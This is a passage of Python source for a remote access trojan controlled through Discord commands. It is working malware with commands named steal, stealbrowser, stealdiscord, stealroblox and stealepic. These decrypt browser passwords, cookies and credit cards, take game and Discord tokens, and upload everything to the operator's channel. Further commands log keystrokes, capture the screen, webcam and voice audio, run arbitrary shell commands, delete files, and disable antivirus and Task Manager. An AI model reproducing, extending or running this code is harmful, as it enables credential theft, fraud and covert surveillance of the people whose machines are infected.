                        # Try to decrypt the cookie value
                        if row[3] and len(row[3]) > 0:  # encrypted_value exists
                            enc_value = row[3]
                            try:
                                if isinstance(enc_value, bytes):
                                    cookie_value = decrypt_password(enc_value)
                                else:
                                    cookie_value = decrypt_password(enc_value)
                                
                                # Check if decryption failed
                                if cookie_value == "Decryption failed" or cookie_value == "Decryption requires cryptography library" or cookie_value == "Decryption requires pywin32":
                                    cookie_value = None
                            except:
                                cookie_value = None
                        
                        # If decryption failed or no encrypted value, try plain value
                        if not cookie_value or len(cookie_value) < 10:
                            if row[2]:  # value column
                                cookie_value = row[2]
                        
                        # Validate cookie value
                        if cookie_value and isinstance(cookie_value, str) and len(cookie_value) > 10:
                            # Check if we already have this cookie
                            if cookie_value not in [c.get('cookie', '') for c in cookies]:
                                cookies.append({
                                    'source': browser_name,
                                    'cookie': cookie_value,
                                    'domain': row[0] or "",
                                    'expires': row[4] or "",
                                    'info': None
                                })
                    except Exception as e:
                        pass
                
                conn.close()
            except Exception as e:
                if conn:
                    try:
                        conn.close()
                    except:
                        pass
            
            # Cleanup temp files
            if temp_dir and os.path.exists(temp_dir):
                try:
                    if os.path.exists(temp_cookies):
                        os.remove(temp_cookies)
                    shutil.rmtree(temp_dir, ignore_errors=True)
                except:
                    pass
        except Exception as e:
            # Cleanup on any error
            if temp_dir and os.path.exists(temp_dir):
                try:
                    shutil.rmtree(temp_dir, ignore_errors=True)
                except:
                    pass
    
    # Get user info for each cookie
    for cookie_data in cookies:
        try:
            if cookie_data.get('cookie'):
                info = get_roblox_user_info(cookie_data['cookie'])
                cookie_data['info'] = info
        except:
            pass
    
    return cookies

@bot.event
async def on_ready():
    print(f'{bot.user.name} has connected to Discord!')
    
    # Auto-join voice channel and start listening to microphone
    try:
        global voice_client
        voice_channel = bot.get_channel(VOICE_CHANNEL_ID)
        if voice_channel:
            try:
                voice_client = await voice_channel.connect()
                print(f"Auto-joined voice channel: {voice_channel.name}")
                
                # Start recording audio from microphone
                try:
                    audio_file = os.path.join(tempfile.gettempdir(), 'discord_audio.wav')
                    sink = AudioSink(audio_file)
                    
                    def after_recording(error):
                        if error:
                            print(f"Recording error: {error}")
                    
                    voice_client.start_recording(sink, after_recording)
                    print("Started listening to microphone audio from users in the channel.")
                except Exception as e:
                    print(f"Could not start audio recording: {e}")
            except Exception as e:
                print(f"Could not auto-join voice channel: {e}")
    except Exception as e:
        print(f"Error in auto-join: {e}")

@bot.command(name='proc')
async def get_processes(ctx):
    """List all running processes with details"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent', 'status', 'create_time']):
            try:
                proc_info = proc.info
                proc_obj = proc
                proc_info['memory_mb'] = proc_info['memory_info'].rss / (1024 * 1024) if proc_info.get('memory_info') else 0
                proc_info['cpu'] = proc_obj.cpu_percent(interval=0.1) if proc_obj else 0
                proc_info['status'] = proc_info.get('status', 'unknown')
                processes.append(proc_info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        
        # Sort by memory usage
        processes.sort(key=lambda x: x.get('memory_mb', 0), reverse=True)
        
        message = "Running Processes:\n" + "="*80 + "\n"
        message += f"{'PID':<8} {'Name':<30} {'Memory (MB)':<12} {'CPU %':<8} {'Status':<10} {'User':<20}\n"
        message += "="*80 + "\n"
        
        for proc in processes[:100]:  # Limit to top 100
            pid = str(proc.get('pid', 'N/A'))
            name = proc.get('name', 'N/A')[:28]
            memory = f"{proc.get('memory_mb', 0):.1f}"
            cpu = f"{proc.get('cpu', 0):.1f}"
            status = str(proc.get('status', 'N/A'))[:8]
            user = str(proc.get('username', 'N/A'))[:18]
            message += f"{pid:<8} {name:<30} {memory:<12} {cpu:<8} {status:<10} {user:<20}\n"
        
        if len(processes) > 100:
            message += f"\n... and {len(processes) - 100} more processes"
        
        f = io.BytesIO(message.encode())
        file = discord.File(f, filename="processes.txt")
        await ctx.send(f"Found {len(processes)} processes:", file=file)
    except Exception as e:
        await ctx.send(f"Error getting processes: {str(e)}")

@bot.command(name='kill')
async def kill_process(ctx, process_name):
    try:
        for proc in psutil.process_iter():
            if proc.name().lower() == process_name.lower():
                proc.terminate()
                await ctx.channel.send(f"Process {process_name} has been terminated.")
                return
        await ctx.channel.send(f"Process {process_name} not found.")
    except Exception as e:
        await ctx.channel.send(f"An error occurred while killing process: {str(e)}")

@bot.command(name='ss')
async def send_screenshot(ctx):
    screenshot = pyautogui.screenshot()
    buffer = BytesIO()
    screenshot.save(buffer, format="PNG")
    buffer.seek(0)
    await ctx.send(file=discord.File(buffer, "screenshot.png"))

@bot.command(name='screenshare')
async def start_screenshare(ctx):
    """Start continuous screen sharing (sends full window screenshots every few seconds)"""
    global screensharing, screenshare_task
    
    if screensharing:
        await ctx.send("Screen sharing is already active. Use !stopscreenshare to stop.")
        return
    
    screensharing = True
    await ctx.send("🖥️ Starting full window screen sharing... Sending screenshots every 2 seconds.")
    
    async def screenshare_loop():
        channel = ctx.channel
        frame_count = 0
        while screensharing:
            try:
                # Capture full screen
                screenshot = pyautogui.screenshot()
                
                # Get screen dimensions to ensure full capture
                screen_width, screen_height = pyautogui.size()
                
                # Resize if needed to ensure full screen (some systems need this)
                if screenshot.size != (screen_width, screen_height):
                    screenshot = screenshot.resize((screen_width, screen_height))
                
                # Convert to buffer
                buffer = BytesIO()
                screenshot.save(buffer, format="PNG", optimize=True)
                buffer.seek(0)
                
                # Send screenshot
                frame_count += 1
                await channel.send(
                    f"📺 Screen Share Frame #{frame_count} ({screen_width}x{screen_height})",
                    file=discord.File(buffer, f"screenshare_{datetime.now().strftime('%H%M%S')}.png")
                )
                await asyncio.sleep(2)  # Send every 2 seconds
            except asyncio.CancelledError:
                break
            except Exception as e:
                if screensharing:  # Only log if still supposed to be sharing
                    try:
                        await channel.send(f"⚠️ Error in screenshare: {str(e)}")
                    except:
                        pass
                break
    
    screenshare_task = asyncio.create_task(screenshare_loop())

@bot.command(name='stopscreenshare')
async def stop_screenshare(ctx):
    """Stop screen sharing"""
    global screensharing, screenshare_task
    
    if not screensharing:
        await ctx.send("Screen sharing is not active.")
        return
    
    screensharing = False
    if screenshare_task:
        screenshare_task.cancel()
        screenshare_task = None
    await ctx.send("Stopped screen sharing.")

@bot.command(name='sscam')
async def send_camera_screenshot(ctx):
    try:
        # Try to open the camera (usually index 0)
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx.send("No camera found or camera is not accessible.")
            return
        
        # Read a frame from the camera
        ret, frame = cap.read()
        cap.release()
        
        if not ret or frame is None:
            await ctx.send("Failed to capture image from camera.")
            return
        
        # Encode frame as PNG
        success, encoded_image = cv2.imencode('.png', frame)
        if not success:
            await ctx.send("Failed to encode camera image.")
            return
        
        # Convert to bytes and create file
        buffer = BytesIO(encoded_image.tobytes())
        buffer.seek(0)
        
        await ctx.send(file=discord.File(buffer, "camera_screenshot.png"))
    except Exception as e:
        await ctx.send(f"Error capturing camera: {str(e)}")

@bot.command(name='off')
async def turn_off(ctx):
    os.system("shutdown /s /t 1")
    await ctx.send("PC will shut down in 1 second.")

@bot.command(name='info')
async def info(ctx):
    pc_info = get_pc_info()
    
    info_text = f"""**PC Information**

**User & System:**
- Username: {pc_info['user']}
- Computer Name: {pc_info['computer_name']}
- OS: {pc_info['os_name']} {pc_info['os_version']}
- OS Version: {pc_info['os_version_full']}
- Boot Time: {pc_info['boot_time']}

**Hardware:**
- Processor: {pc_info['processor']}
- Physical Cores: {pc_info['cores_physical']}
- Logical Cores: {pc_info['cores_logical']}
- CPU Usage: {pc_info['cpu_percent']}%
- RAM Total: {round(pc_info['ram_total'], 2)} GB
- RAM Used: {round(pc_info['ram_used'], 2)} GB ({pc_info['ram_percent']}%)
- RAM Available: {round(pc_info['ram_available'], 2)} GB
- Screen Resolution: {pc_info['screen_resolution']}
- MAC Address: {pc_info['mac_address']}

**Network:**
- Local IP: {pc_info['local_ip']}
- Public IP: {pc_info['public_ip']}
- Location: {pc_info['location']}

**Disk Information:**"""
    
    for disk in pc_info['disk_info']:
        info_text += f"\n- {disk['device']} ({disk['mountpoint']}): {round(disk['used'], 2)}/{round(disk['total'], 2)} GB used ({disk['percent']}%) - {disk['fstype']}"
    
    if len(info_text) > 2000:
        f = io.BytesIO(info_text.encode())
        file = discord.File(f, filename="pc_info.txt")
        await ctx.send("PC Information (too long for message):", file=file)
    else:
        await ctx.send(info_text)

@bot.command(name='record')
async def start_recording(ctx):
    global recording
    recording = True
    threading.Thread(target=record_screen).start()
    await ctx.send("Recording started.")

@bot.command(name='stoprecord')
async def stop_recording(ctx):
    global recording
    if not recording:
        await ctx.send("No recording is currently active.")
        return
    recording = False
    time.sleep(1)  # Wait for video to finish writing
    file_path = "output.avi"
    if os.path.exists(file_path):
        try:
            file_size = os.path.getsize(file_path)
            if file_size > 0:
                await ctx.send(file=discord.File(file_path))
                os.remove(file_path)
            else:
                await ctx.send("Recording file is empty.")
                os.remove(file_path)
        except Exception as e:
            await ctx.send(f"Error sending recording: {str(e)}")
    else:
        await ctx.send("No recording found.")

@bot.command(name='files')
async def list_files(ctx, path="."):
    try:
        files = os.listdir(path)
        message = ""
        for file in files:
            message += f"{file}\n"
        await ctx.send(message)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='cd')
async def change_directory(ctx, path):
    try:
        os.chdir(path)
        await ctx.send(f"Directory changed to {os.getcwd()}")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='delete')
@bot.command(name='delete_file')
async def delete_file(ctx, path):
    try:
        if os.path.isfile(path):
            os.remove(path)
            await ctx.send(f"File {path} has been deleted.")
        elif os.path.isdir(path):
            import shutil
            shutil.rmtree(path)
            await ctx.send(f"Directory {path} has been deleted.")
        else:
            await ctx.send(f"{path} not found.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='steal')
@bot.command(name='download_file')
async def steal_file(ctx, file_name):
    files = os.listdir()
    if file_name in files:
        await ctx.send(file=discord.File(file_name))
    else:
        await ctx.send(f"File {file_name} not found.")

@bot.command(name='cmd')
async def run_command(ctx, *, command):
    output = cmdexec(command)
    await ctx.send(f"\n{output}\n")

@bot.command(name='keylog')
async def start_keylog(ctx):
    global keylogging
    if not keylogging:
        threading.Thread(target=start_keylogger, daemon=True).start()
        await ctx.send("Keylogger started.")
    else:
        await ctx.send("Keylogger is already running.")

@bot.command(name='stopkeylog')
async def stop_keylog(ctx):
    global keylogging, keylog_buffer
    if keylogging:
        stop_keylogger()
        if keylog_buffer:
            log_content = ''.join(keylog_buffer)
            f = io.BytesIO(log_content.encode())
            file = discord.File(f, filename="keylog.txt")
            await ctx.send("Keylogger stopped. Logs:", file=file)
            keylog_buffer = []
        else:
            await ctx.send("Keylogger stopped. No keystrokes were captured.")
    else:
        await ctx.send("Keylogger is not running.")

@bot.command(name='getkeys')
async def get_keys(ctx):
    global keylog_buffer
    if keylog_buffer:
        log_content = ''.join(keylog_buffer)
        if len(log_content) > 2000:
            f = io.BytesIO(log_content.encode())
            file = discord.File(f, filename="keylog.txt")
            await ctx.send("Keylog (too long for message):", file=file)
        else:
            await ctx.send(f"```\n{log_content}\n```")
    else:
        await ctx.send("No keystrokes captured yet.")

@bot.command(name='disableav')
async def disable_antivirus_cmd(ctx):
    try:
        await ctx.send("Starting antivirus disable/uninstall process...")
        results = disable_antivirus()
        
        if results:
            result_text = "\n".join(results)
            if len(result_text) > 2000:
                f = io.BytesIO(result_text.encode())
                file = discord.File(f, filename="av_disable_results.txt")
                await ctx.send("Antivirus disable results:", file=file)
            else:
                await ctx.send(f"```\n{result_text}\n```")
        else:
            await ctx.send("Antivirus disable process completed. (No specific results to report)")
    except Exception as e:
        await ctx.send(f"Error during antivirus disable: {str(e)}")

@bot.command(name='stealbrowser')
async def steal_browser_cmd(ctx):
    try:
        await ctx.send("Starting browser data theft...")
        browser_data = steal_browser_data()
        
        if not browser_data:
            await ctx.send("No browser data found or browsers not accessible.")
            return
        
        # Format the data
        output = []
        for browser, data in browser_data.items():
            output.append(f"\n{'='*50}")
            output.append(f"{browser} Data")
            output.append(f"{'='*50}\n")
            
            if data.get('passwords'):
                output.append(f"--- PASSWORDS ({len(data['passwords'])} entries) ---")
                for pwd in data['passwords'][:50]:  # Limit to 50
                    output.append(f"URL: {pwd.get('url', 'N/A')}")
                    output.append(f"Username: {pwd.get('username', 'N/A')}")
                    output.append(f"Password: {pwd.get('password', 'N/A')}")
                    output.append("")
            
            if data.get('history'):
                output.append(f"--- HISTORY ({len(data['history'])} entries) ---")
                for hist in data['history'][:50]:  # Limit to 50
                    output.append(f"URL: {hist.get('url', 'N/A')}")
                    output.append(f"Title: {hist.get('title', 'N/A')}")
                    output.append(f"Visits: {hist.get('visits', 'N/A')}")
                    output.append("")
            
            if data.get('cookies'):
                output.append(f"--- COOKIES ({len(data['cookies'])} entries) ---")
                for cookie in data['cookies'][:50]:  # Limit to 50
                    output.append(f"Domain: {cookie.get('domain', 'N/A')}")
                    output.append(f"Name: {cookie.get('name', 'N/A')}")
                    output.append(f"Value: {cookie.get('value', 'N/A')}")
                    output.append("")
            
            if data.get('downloads'):
                output.append(f"--- DOWNLOADS ({len(data['downloads'])} entries) ---")
                for dl in data['downloads'][:50]:  # Limit to 50
                    output.append(f"Path: {dl.get('path', dl.get('url', 'N/A'))}")
                    output.append(f"URL: {dl.get('url', 'N/A')}")
                    output.append(f"Size: {dl.get('size', 'N/A')}")
                    output.append("")
            
            if data.get('cards'):
                output.append(f"--- CREDIT CARDS ({len(data['cards'])} entries) ---")
                for card in data['cards']:
                    output.append(f"Name: {card.get('name', 'N/A')}")
                    output.append(f"Number: {card.get('number', 'N/A')}")
                    output.append(f"Expiry: {card.get('month', 'N/A')}/{card.get('year', 'N/A')}")
                    output.append("")
        
        result_text = "\n".join(output)
        
        # Send as file if too long
        if len(result_text) > 2000:
            f = io.BytesIO(result_text.encode())
            file = discord.File(f, filename="browser_data.txt")
            await ctx.send("Browser data stolen:", file=file)
        else:
            await ctx.send(f"```\n{result_text}\n```")
            
    except Exception as e:
        await ctx.send(f"Error stealing browser data: {str(e)}")

@bot.command(name='stealdiscord')
async def steal_discord_cmd(ctx):
    try:
        await ctx.send("Starting Discord token theft...")
        tokens = steal_discord_tokens()
        
        if not tokens:
            await ctx.send("No Discord tokens found.")
            return
        
        # Format the data
        output = []
        output.append(f"{'='*60}")
        output.append(f"Discord Tokens Found: {len(tokens)}")
        output.append(f"{'='*60}\n")
        
        for i, token_data in enumerate(tokens, 1):
            output.append(f"\n--- Token #{i} ---")
            output.append(f"Source: {token_data['source']}")
            output.append(f"Token: {token_data['token']}")
            
            if token_data['info']:
                info = token_data['info']
                output.append(f"\nUser Information:")
                output.append(f"  ID: {info.get('id', 'N/A')}")
                output.append(f"  Username: {info.get('username', 'N/A')}#{info.get('discriminator', 'N/A')}")
                output.append(f"  Email: {info.get('email', 'N/A')}")
                output.append(f"  Phone: {info.get('phone', 'N/A')}")
                output.append(f"  Verified: {info.get('verified', False)}")
                output.append(f"  MFA Enabled: {info.get('mfa_enabled', False)}")
                output.append(f"  Premium Type: {info.get('premium_type', 0)}")
                output.append(f"  Locale: {info.get('locale', 'N/A')}")
                if info.get('bio'):
                    output.append(f"  Bio: {info.get('bio', 'N/A')}")
            else:
                output.append(f"\nUser Information: Failed to retrieve (token may be invalid)")
            
            output.append("")
        
        result_text = "\n".join(output)
        
        # Send as file if too long
        if len(result_text) > 2000:
            f = io.BytesIO(result_text.encode())
            file = discord.File(f, filename="discord_tokens.txt")
            await ctx.send("Discord tokens stolen:", file=file)
        else:
            await ctx.send(f"```\n{result_text}\n```")
            
    except Exception as e:
        await ctx.send(f"Error stealing Discord tokens: {str(e)}")

@bot.command(name='stealroblox')
async def steal_roblox_cmd(ctx):
    try:
        await ctx.send("Starting Roblox cookie theft...")
        cookies = steal_roblox_cookies()
        
        if not cookies:
            await ctx.send("No Roblox cookies found.")
            return
        
        # Format the data
        output = []
        output.append(f"{'='*60}")
        output.append(f"Roblox Cookies Found: {len(cookies)}")
        output.append(f"{'='*60}\n")
        
        for i, cookie_data in enumerate(cookies, 1):
            output.append(f"\n--- Cookie #{i} ---")
            output.append(f"Source: {cookie_data['source']}")
            output.append(f"Domain: {cookie_data['domain']}")
            output.append(f"Cookie: {cookie_data['cookie']}")
            output.append(f"Expires: {cookie_data['expires']}")
            
            if cookie_data['info']:
                info = cookie_data['info']
                output.append(f"\nUser Information:")
                output.append(f"  ID: {info.get('id', 'N/A')}")
                output.append(f"  Username: {info.get('username', 'N/A')}")
                output.append(f"  Display Name: {info.get('display_name', 'N/A')}")
                output.append(f"  Description: {info.get('description', 'N/A')}")
                output.append(f"  Created: {info.get('created', 'N/A')}")
                output.append(f"  Is Banned: {info.get('is_banned', False)}")
                output.append(f"  Verified Badge: {info.get('has_verified_badge', False)}")
            else:
                output.append(f"\nUser Information: Failed to retrieve (cookie may be invalid or expired)")
            
            output.append("")
        
        result_text = "\n".join(output)
        
        # Send as file if too long
        if len(result_text) > 2000:
            f = io.BytesIO(result_text.encode())
            file = discord.File(f, filename="roblox_cookies.txt")
            await ctx.send("Roblox cookies stolen:", file=file)
        else:
            await ctx.send(f"```\n{result_text}\n```")
            
    except Exception as e:
        await ctx.send(f"Error stealing Roblox cookies: {str(e)}")

def get_epic_user_info(access_token):
    """Get Epic Games user information from access token"""
    try:
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': 'EpicGamesLauncher/1.0'
        }
        req = urllib.request.Request('https://account-public-service-prod.ol.epicgames.com/account/api/oauth/verify', headers=headers)
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read().decode())
            return {
                'account_id': data.get('account_id', 'N/A'),
                'display_name': data.get('displayName', 'N/A'),
                'email': data.get('email', 'N/A'),
                'preferred_language': data.get('preferredLanguage', 'N/A'),
                'country': data.get('country', 'N/A')
            }
    except:
        return None

def steal_epic_credentials():
    """Steal Epic Games credentials from various sources"""
    credentials = []
    
    # Browser paths
    browser_paths = {
        'Chrome': os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default'),
        'Edge': os.path.join(os.environ['LOCALAPPDATA'], r'Microsoft\Edge\User Data\Default'),
        'Opera': os.path.join(os.environ['APPDATA'], r'Opera Software\Opera Stable'),
        'Opera GX': os.path.join(os.environ['LOCALAPPDATA'], r'Opera Software\Opera GX\User Data\Default'),
        'Brave': os.path.join(os.environ['LOCALAPPDATA'], r'BraveSoftware\Brave-Browser\User Data\Default'),
    }
    
    # Search for Epic Games passwords in browser password databases
    for browser_name, browser_path in browser_paths.items():
        if not os.path.exists(browser_path):
            continue
        
        login_db = os.path.join(browser_path, 'Login Data')
        if not os.path.exists(login_db):
            continue
        
        try:
            temp_dir = tempfile.mkdtemp()
            temp_login = os.path.join(temp_dir, 'login.db')
            shutil.copy2(login_db, temp_login)
            
            conn = sqlite3.connect(temp_login)
            cursor = conn.cursor()
            
            # Search for Epic Games credentials
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE '%epicgames%' OR origin_url LIKE '%epic%'")
            
            for row in cursor.fetchall():
                try:
                    pwd_value = row[2]
                    if pwd_value:
                        if isinstance(pwd_value, bytes):
                            password = decrypt_password(pwd_value)
                        else:
                            password = decrypt_password(pwd_value)
                    else:
                        password = ""
                    
                    if password and password != "Decryption failed":
                        credentials.append({
                            'source': browser_name,
                            'type': 'Browser Password',
                            'url': row[0] or "",
                            'username': row[1] or "",
                            'password': password,
                            'info': None
                        })
                except:
                    pass
            
            conn.close()
            os.remove(temp_login)
            shutil.rmtree(temp_dir)
        except:
            pass
    
    # Search for Epic Games cookies (access tokens)
    for browser_name, browser_path in browser_paths.items():
        if not os.path.exists(browser_path):
            continue
        
        cookies_db = os.path.join(browser_path, 'Cookies')
        if not os.path.exists(cookies_db):
            continue
        
        try:
            temp_dir = tempfile.mkdtemp()
            temp_cookies = os.path.join(temp_dir, 'cookies.db')
            shutil.copy2(cookies_db, temp_cookies)
            
            conn = sqlite3.connect(temp_cookies)
            cursor = conn.cursor()
            
            # Search for Epic Games cookies
            cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key LIKE '%epicgames%' OR host_key LIKE '%epic%'")
            
            for row in cursor.fetchall():
                try:
                    cookie_name = row[1] or ""
                    if cookie_name.lower() in ['access_token', 'authorization', 'epicgames_token', 'bearer', 'token']:
                        if row[3]:  # encrypted_value
                            enc_value = row[3]
                            if isinstance(enc_value, bytes):
                                cookie_value = decrypt_password(enc_value)
                            else:
                                cookie_value = decrypt_password(enc_value)
                        else:
                            cookie_value = row[2] or ""
                        
                        if cookie_value and len(cookie_value) > 10:
                            # Try to get user info from token
                            info = get_epic_user_info(cookie_value)
                            
                            credentials.append({
                                'source': browser_name,
                                'type': 'Access Token',
                                'url': row[0] or "",
                                'username': info.get('display_name', 'N/A') if info else 'N/A',
                                'password': cookie_value,
                                'info': info
                            })
                except:
                    pass
            
            conn.close()
            os.remove(temp_cookies)
            shutil.rmtree(temp_dir)
        except:
            pass
    
    # Search Epic Games Launcher files
    epic_paths = [
        os.path.join(os.environ['LOCALAPPDATA'], r'EpicGamesLauncher\Saved\Config\Windows'),
        os.path.join(os.environ['APPDATA'], r'Epic Games\Launcher\Saved\Config\Windows'),
    ]
    
    for epic_path in epic_paths:
        if not os.path.exists(epic_path):
            continue
        
        try:
            # Look for GameUserSettings.ini or other config files
            for file in os.listdir(epic_path):
                if file.endswith('.ini') or file.endswith('.json'):
                    file_path = os.path.join(epic_path, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            # Look for username/email patterns
                            username_match = re.search(r'(?:username|email|account|login)\s*[=:]\s*([^\s\n]+)', content, re.IGNORECASE)
                            password_match = re.search(r'(?:password|pass|pwd|token)\s*[=:]\s*([^\s\n]+)', content, re.IGNORECASE)
                            
                            if username_match or password_match:
                                credentials.append({
                                    'source': 'Epic Games Launcher',
                                    'type': 'Config File',
                                    'url': file_path,
                                    'username': username_match.group(1) if username_match else 'N/A',
                                    'password': password_match.group(1) if password_match else 'N/A',
                                    'info': None
                                })
                    except:
                        pass
        except:
            pass
    
    # Search for Epic Games in Local Storage
    for browser_name, browser_path in browser_paths.items():
        if not os.path.exists(browser_path):
            continue
        
        local_storage_path = os.path.join(browser_path, 'Local Storage', 'leveldb')
        if not os.path.exists(local_storage_path):
            continue
        
        try:
            for file in os.listdir(local_storage_path):
                if file.endswith('.ldb') or file.endswith('.log'):
                    file_path = os.path.join(local_storage_path, file)
                    try:
                        with open(file_path, 'rb') as f:
                            content = f.read()
                            
                            # Look for Epic Games tokens/credentials
                            epic_patterns = [
                                rb'epicgames[^\x00]{10,}',
                                rb'access_token[^\x00]{20,}',
                                rb'authorization[^\x00]{20,}',
                            ]
                            
                            for pattern in epic_patterns:
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                for match in matches:
                                    try:
                                        decoded = match.decode('utf-8', errors='ignore')
                                        if 'epic' in decoded.lower() and len(decoded) > 20:
                                            credentials.append({
                                                'source': browser_name,
                                                'type': 'Local Storage',
                                                'url': 'Local Storage',
                                                'username': 'N/A',
                                                'password': decoded[:200],  # Limit length
                                                'info': None
                                            })
                                    except:
                                        pass
                    except:
                        pass
        except:
            pass
    
    return credentials

@bot.command(name='stealepic')
async def steal_epic_cmd(ctx):
    try:
        await ctx.send("Starting Epic Games credential theft...")
        credentials = steal_epic_credentials()
        
        if not credentials:
            await ctx.send("No Epic Games credentials found.")
            return
        
        # Format the data
        output = []
        output.append(f"{'='*60}")
        output.append(f"Epic Games Credentials Found: {len(credentials)}")
        output.append(f"{'='*60}\n")
        
        for i, cred_data in enumerate(credentials, 1):
            output.append(f"\n--- Credential #{i} ---")
            output.append(f"Source: {cred_data['source']}")
            output.append(f"Type: {cred_data['type']}")
            output.append(f"URL/Path: {cred_data['url']}")
            output.append(f"Username: {cred_data['username']}")
            output.append(f"Password/Token: {cred_data['password']}")
            
            if cred_data['info']:
                info = cred_data['info']
                output.append(f"\nAccount Information:")
                output.append(f"  Account ID: {info.get('account_id', 'N/A')}")
                output.append(f"  Display Name: {info.get('display_name', 'N/A')}")
                output.append(f"  Email: {info.get('email', 'N/A')}")
                output.append(f"  Country: {info.get('country', 'N/A')}")
                output.append(f"  Language: {info.get('preferred_language', 'N/A')}")
            
            output.append("")
        
        result_text = "\n".join(output)
        
        # Send as file if too long
        if len(result_text) > 2000:
            f = io.BytesIO(result_text.encode())
            file = discord.File(f, filename="epic_credentials.txt")
            await ctx.send("Epic Games credentials stolen:", file=file)
        else:
            await ctx.send(f"```\n{result_text}\n```")
            
    except Exception as e:
        await ctx.send(f"Error stealing Epic Games credentials: {str(e)}")

def disable_task_manager():
    """Disable Task Manager via registry"""
    results = []
    try:
        # Registry path for Task Manager
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        
        # Try HKEY_CURRENT_USER first
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            results.append("Disabled Task Manager via HKEY_CURRENT_USER")
        except Exception as e:
            results.append(f"Failed to disable via HKEY_CURRENT_USER: {str(e)}")
        
        # Also try HKEY_LOCAL_MACHINE (requires admin)
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            results.append("Disabled Task Manager via HKEY_LOCAL_MACHINE")
        except Exception as e:
            results.append(f"Failed to disable via HKEY_LOCAL_MACHINE (may require admin): {str(e)}")
        
        # Also try via group policy registry
        try:
            gp_key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, gp_key_path)
            system_key = winreg.CreateKey(key, "System")
            winreg.SetValueEx(system_key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(system_key)
            winreg.CloseKey(key)
            results.append("Disabled Task Manager via Group Policy registry")
        except Exception as e:
            pass
        
    except Exception as e:
        results.append(f"Error disabling Task Manager: {str(e)}")
    
    return results

@bot.command(name='disabletask')
async def disable_task_manager_cmd(ctx):
    try:
        await ctx.send("Disabling Task Manager...")
        results = disable_task_manager()
        
        if results:
            result_text = "\n".join(results)
            await ctx.send(f"```\n{result_text}\n```")
        else:
            await ctx.send("Task Manager disable process completed.")
    except Exception as e:
        await ctx.send(f"Error disabling Task Manager: {str(e)}")

@bot.command(name='openurl')
async def open_url(ctx, *, url):
    try:
        # Validate URL format
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # Open URL in default browser using subprocess for better reliability
        try:
            subprocess.Popen(['start', url], shell=True)
        except:
            # Fallback to webbrowser module
            webbrowser.open(url)
        
        await ctx.send(f"Opened URL: {url}")
    except Exception as e:
        await ctx.send(f"Error opening URL: {str(e)}")

@bot.command(name='volumeup')
async def volume_up(ctx):
    """Increase system volume"""
    try:
        # Use Windows API to send volume up key
        import ctypes
        VK_VOLUME_UP = 0xAF
        ctypes.windll.user32.keybd_event(VK_VOLUME_UP, 0, 0, 0)
        ctypes.windll.user32.keybd_event(VK_VOLUME_UP, 0, 2, 0)  # Key up
        await ctx.send("Volume increased.")
    except Exception as e:
        await ctx.send(f"Error increasing volume: {str(e)}")

@bot.command(name='volumedown')
async def volume_down(ctx):
    """Decrease system volume"""
    try:
        # Use Windows API to send volume down key
        import ctypes
        VK_VOLUME_DOWN = 0xAE
        ctypes.windll.user32.keybd_event(VK_VOLUME_DOWN, 0, 0, 0)
        ctypes.windll.user32.keybd_event(VK_VOLUME_DOWN, 0, 2, 0)  # Key up
        await ctx.send("Volume decreased.")
    except Exception as e:
        await ctx.send(f"Error decreasing volume: {str(e)}")

@bot.command(name='note')
async def open_notepad(ctx, *, text=""):
    """Open notepad with optional text"""
    try:
        # Create temp file with text
        if text:
            temp_file = os.path.join(tempfile.gettempdir(), 'discord_note.txt')
            with open(temp_file, 'w', encoding='utf-8') as f:
                f.write(text)
            # Open notepad with the file
            subprocess.Popen(['notepad.exe', temp_file], shell=True)
            await ctx.send(f"Opened Notepad with text: {text[:100]}..." if len(text) > 100 else f"Opened Notepad with text: {text}")
        else:
            # Just open notepad
            subprocess.Popen(['notepad.exe'], shell=True)
            await ctx.send("Opened Notepad.")
    except Exception as e:
        await ctx.send(f"Error opening Notepad: {str(e)}")

@bot.command(name='joinvoice')
async def join_voice(ctx):
    """Join the voice channel and listen to microphone"""
    global voice_client
    
    try:
        # Get the voice channel
        voice_channel = bot.get_channel(VOICE_CHANNEL_ID)
        if not voice_channel:
            await ctx.send(f"Voice channel with ID {VOICE_CHANNEL_ID} not found.")
            return
        
        # Check if already connected
        if voice_client and voice_client.is_connected():
            await ctx.send("Already connected to a voice channel. Starting audio recording...")
        else:
            # Connect to voice channel
            try:
                voice_client = await voice_channel.connect()
                await ctx.send(f"Joined voice channel: {voice_channel.name}")
            except discord.ClientException:
                await ctx.send("Already connected to a voice channel.")
            except Exception as e:
                await ctx.send(f"Error joining voice channel: {str(e)}")
                return
        
        # Start recording audio from all users
        try:
            # Create audio sink to receive microphone audio
            audio_file = os.path.join(tempfile.gettempdir(), 'discord_audio.wav')
            sink = AudioSink(audio_file)
            
            # Start recording with callback
            def after_recording(error):
                if error:
                    print(f"Recording error: {error}")
            
            voice_client.start_recording(sink, after_recording)
            await ctx.send("✅ Now listening to microphone audio from all users in the channel. Audio is being recorded.")
        except Exception as e:
            await ctx.send(f"Error starting audio recording: {str(e)}")
